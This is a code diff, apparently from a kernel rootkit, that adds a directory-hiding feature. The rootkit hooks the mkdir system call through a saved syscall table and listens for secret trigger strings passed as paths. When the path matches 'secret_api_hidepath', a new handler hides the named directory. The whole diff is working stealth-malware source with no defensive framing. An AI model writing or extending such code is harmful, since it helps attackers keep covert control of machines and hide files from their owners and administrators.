@@ -11,6 +11,13 @@
 #include "syscall.h"
 #include "utility.h"
 #include "secrets.h"
+#include "hiddenDirectories.h"
+
+int hideDirectoryApiHandler(char* path) {
+	int i;
+	hideDirectory(path);
+	return 0;
+}
 
 int printApiHandler(char* arg) {
 	//a debugging target.
@@ -33,6 +40,9 @@ int mkdirShim(char* path) {
 	}
 	else if (strnstrn(path, strnlen(path, 20), secret_api_deactivate, 20)) {
 		return deactivateApiHandler();
+	}
+	else if (strnstrn(path, strnlen(path, 20), secret_api_hidepath, 20)) {
+		return hideDirectoryApiHandler(path + 20);
 	}
 	return ((SYS_mkdir_type)backup_sys_call_table[SYS_mkdir])(path);
 }
